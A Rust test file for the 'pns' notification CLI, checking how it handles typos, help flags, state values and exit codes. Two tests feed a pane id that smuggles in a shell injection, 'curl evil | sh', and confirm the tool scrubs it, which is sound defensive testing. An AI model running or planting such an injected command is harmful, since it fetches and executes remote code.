use super::*;

#[test]
fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
    let sandbox = Sandbox::new("pane-scrub");
    let output = run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args([
            "send",
            "--producer",
            "claude",
            "--state",
            "done",
            "--detail",
            "x",
        ])
        .args(["--pane", "wW:p1; curl evil | sh"]));
    assert!(sandbox.fired("macos-banner"));
    assert_eq!(sandbox.event("macos-banner")["pane"], "");
    assert!(
        stderr(&output).contains("dropped a pane id with shell metacharacters"),
        "{output:?}"
    );
}

#[test]
fn a_scrub_warning_is_not_printed_when_no_channel_will_run() {
    let sandbox = Sandbox::new("scrub-silent");
    let output = run(sandbox
        .pns()
        .args(["send", "--producer", "claude", "--state", "done"])
        .args(["--pane", "wW:p1; curl evil | sh"])
        .args(["--scope", "local_only"]));
    assert!(!stderr(&output).contains("dropped a pane id"), "{output:?}");
}

#[test]
fn a_non_unicode_argument_never_breaks_the_exit_zero_edge() {
    // The engine sits on an always-exit-0 path; a stray byte in argv must
    // degrade like any unknown token, not abort the notification.
    let sandbox = Sandbox::new("non-unicode");
    let output = run(sandbox
        .pns()
        .arg("send")
        .arg(OsStr::from_bytes(&[0xff]))
        .args(["--scope", "local_only"]));
    assert_eq!(output.status.code(), Some(0), "{output:?}");
}

#[test]
fn the_help_flag_prints_the_usage_and_reaches_nothing_at_all() {
    // A help print used to be an EVENT: it loaded the config, spawned every
    // presence probe and delivered a notification reading "pns · done" to
    // whatever channel was configured. Nothing about printing the commands
    // needs the machine read, so nothing here may reach it.
    for spelling in ["--help", "-h"] {
        let (sandbox, mut command) = desk_with_a_native_banner("help");
        let output = run(command.arg(spelling));

        let printed = stdout(&output);
        assert!(printed.contains("usage"), "{spelling}: {printed}");
        assert_eq!(stderr(&output), "", "help is not a complaint: {output:?}");
        assert_eq!(
            sandbox.spawned(),
            "",
            "a help print spawns nothing: {output:?}"
        );
        assert!(
            !sandbox.state().exists(),
            "and writes no state either: {output:?}"
        );
    }
}

#[test]
fn a_word_that_names_no_command_is_refused_and_delivers_nothing() {
    // THE HOUSE RULE `pns nag` already keeps, moved up to the top-level
    // dispatch: an unknown argument never falls through to a fire. A mistyped
    // subcommand used to reach the lenient producer parser, which skipped the
    // word it did not know and notified about an empty event, so `pns stpo`
    // raised a banner and could card the operator's phone.
    //
    // THE REFUSAL READS ONLY THE FIRST WORD: whatever trails a subcommand
    // pns does not know is refused the same way regardless, so a mistyped
    // flag (`--wat`) refuses exactly like a mistyped word.
    for argv in [&["stpo"][..], &["stpo", "--wat"][..]] {
        let (sandbox, mut command) = desk_with_a_native_banner("typo");
        let output = command.args(argv).output().expect("the engine runs");

        assert_eq!(
            output.status.code(),
            Some(2),
            "{argv:?}: a refusal, never exit 0"
        );
        let complaint = stderr(&output);
        assert!(
            complaint.contains("usage"),
            "and the usage is on stderr: {output:?}"
        );
        assert_eq!(
            stdout(&output),
            "",
            "nothing was delivered to say: {output:?}"
        );
        assert_eq!(sandbox.spawned(), "", "a typo spawns nothing: {output:?}");
        assert!(
            !sandbox.state().exists(),
            "and writes no state either: {output:?}"
        );
    }
}

#[test]
fn a_dash_led_first_word_is_no_longer_a_free_pass_for_an_empty_event() {
    // R5-1: `first.starts_with('-')` used to make ANY dash-led argv[1] a
    // producer invocation, so a mistyped flag delivered an empty event in
    // silence, the `pns stpo` bug reopened for a typo that happens to start
    // with a dash. None of these carries a flag the parser recognizes.
    for word in [
        "--wat",
        "-",
        "--",
        "--help=x",
        "--HELP",
        "-help",
        "--producer=claude",
    ] {
        let sandbox = Sandbox::new("dash-led-typo");
        let output = sandbox.pns().arg(word).output().expect("the engine runs");
        assert_eq!(
            output.status.code(),
            Some(2),
            "{word:?}: a refusal, never exit 0"
        );
        assert!(stderr(&output).contains("usage"), "{word:?}: {output:?}");
        assert!(!sandbox.fired("mobile"), "{word:?} delivered: {output:?}");
        assert!(!sandbox.fired("hermes"), "{word:?} delivered: {output:?}");
    }
}

#[test]
fn a_typed_empty_word_is_refused_unlike_the_bare_invocation_beside_it() {
    // R5-3: `unwrap_or_default().is_empty()` conflated "no argv[1] at all"
    // with "argv[1] is the literal empty string", so `pns ""` delivered the
    // same empty event a truly bare `pns` does. `doctor` and `setup` already
    // refuse an unknown extra argument; this is that same rule reaching the
    // top-level dispatch.
    let sandbox = Sandbox::new("typed-empty-word");
    let output = sandbox.pns().arg("").output().expect("the engine runs");
    assert_eq!(output.status.code(), Some(2), "{output:?}");
    assert!(stderr(&output).contains("usage"), "{output:?}");
    assert!(!sandbox.fired("mobile"), "{output:?}");
    assert!(!sandbox.fired("hermes"), "{output:?}");
}

#[test]
fn help_in_flag_position_wins_wherever_it_reaches_the_event_parser() {
    // R5-2 + H-A: help was checked at argv[1] only, so `--producer claude
    // --help` delivered the event with `--help` unconsumed, and `--
    // --help`/`stray --help` reached the lenient producer parser and did the
    // same. Every shape reaches the parser's own help arm instead, and the
    // subcommand in front of them is what says this is a send at all.
    for argv in [
        &["--producer", "claude", "--help"][..],
        &["--scope", "local_only", "--help"][..],
        &["--", "--help"][..],
        &["stray", "--help"][..],
    ] {
        let sandbox = Sandbox::new("help-anywhere");
        let output = sandbox
            .pns()
            .arg("send")
            .args(argv)
            .output()
            .expect("the engine runs");
        assert_eq!(output.status.code(), Some(0), "{argv:?}: {output:?}");
        assert!(stdout(&output).contains("usage"), "{argv:?}: {output:?}");
        assert_eq!(stderr(&output), "", "{argv:?}: {output:?}");
        assert!(
            !sandbox.fired("mobile"),
            "{argv:?} spawned a delivery: {output:?}"
        );
        assert!(
            !sandbox.fired("hermes"),
            "{argv:?} spawned a delivery: {output:?}"
        );
    }
}

#[test]
fn help_in_value_position_is_still_just_a_value() {
    // H-F, PINNED so nobody "fixes" this by adding `--help` to
    // `is_producer_flag`: doing that would flip the value rule and make
    // `--producer --help` warn-and-drop instead of delivering an agent whose
    // name literally is "--help".
    let sandbox = Sandbox::new("help-as-agent-value");
    run(sandbox
        .pns()
        .args(["send", "--producer", "--help", "--state", "done"]));
    assert_eq!(sandbox.event("mobile")["agent"], "--help");

    // The same word in `--state`'s value position is a value too, and the
    // closed set is what refuses it rather than the help text answering.
    let sandbox = Sandbox::new("help-as-state-value");
    let output = sandbox
        .pns()
        .args(["send", "--producer", "claude", "--state", "--help"])
        .output()
        .expect("spawn pns");
    assert_eq!(output.status.code(), Some(2));
    assert_eq!(
        String::from_utf8_lossy(&output.stderr),
        "pns: --state requires one of: done, failed, blocked, resolved, observation, progress\n"
    );
    assert!(!sandbox.fired("mobile"));
}

#[test]
fn a_missing_value_warning_keeps_its_exact_sentence() {
    let sandbox = Sandbox::new("missing-value-warning");
    let output = run(sandbox
        .pns()
        .args(["send", "--detail", "--scope", "local_only"]));
    assert_eq!(
        stderr(&output),
        "pns: --detail given without a value; ignoring\n"
    );
    assert!(!sandbox.fired("mobile"));
    assert!(!sandbox.fired("hermes"));
}

#[test]
fn a_retired_subcommand_spelling_names_the_verb_that_replaced_it() {
    // Both moved under the subcommand that owns what they do, and neither is
    // an alias: the old word is refused the way a typo is, with the new
    // spelling in the message so the reader does not have to look it up.
    for (word, replacement) in [
        ("click", "pns failures open"),
        ("pulse", "pns lights pulse"),
    ] {
        let sandbox = Sandbox::new(&format!("retired-{word}"));
        let output = sandbox
            .pns()
            .args([word, "1"])
            .output()
            .expect("the engine runs");
        assert_eq!(output.status.code(), Some(2), "{word}: {output:?}");
        let complaint = stderr(&output);
        assert!(complaint.contains(replacement), "{word}: {complaint}");
        assert!(!sandbox.fired("mobile"), "{word}: {output:?}");
        assert!(!sandbox.fired("hermes"), "{word}: {output:?}");
    }
}

#[test]
fn an_observation_stated_as_a_flag_is_as_quiet_as_one_stated_as_json() {
    // THE POINT OF THE CLOSED SET: one word means one thing on both paths.
    // `--state observation` used to be an ordinary message while the JSON
    // `observation` was a quiet update, so the same event carded the phone or
    // did not depending on how its producer spelled itself.
    let sandbox = Sandbox::new("flag-observation");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_FORCE_PHONE", "1")
        .args([
            "send",
            "--producer",
            "claude",
            "--state",
            "observation",
            "--detail",
            "x",
        ]));
    assert!(sandbox.fired("macos-banner"));
    assert!(sandbox.fired("hermes"));
    assert!(!sandbox.fired("mobile"), "an observation carded the phone");

    let sandbox = Sandbox::new("flag-done");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_FORCE_PHONE", "1")
        .args([
            "send",
            "--producer",
            "claude",
            "--state",
            "done",
            "--detail",
            "x",
        ]));
    assert!(
        sandbox.fired("mobile"),
        "an ordinary state stopped carding the phone"
    );
}

#[test]
fn a_state_outside_the_closed_set_is_refused_and_nothing_is_delivered() {
    for word in ["first-install-failed", "succeeded", "waiting", "Done", ""] {
        let sandbox = Sandbox::new(&format!("state-refused-{word}"));
        let output = sandbox
            .pns()
            .args(["send", "--producer", "claude", "--state", word])
            .output()
            .expect("spawn pns");
        assert_eq!(output.status.code(), Some(2), "{word}: {output:?}");
        assert_eq!(
            String::from_utf8_lossy(&output.stderr),
            "pns: --state requires one of: done, failed, blocked, resolved, observation, progress\n",
            "{word}"
        );
        assert!(!sandbox.fired("macos-banner"), "{word}");
        assert!(!sandbox.fired("hermes"), "{word}");
    }
}
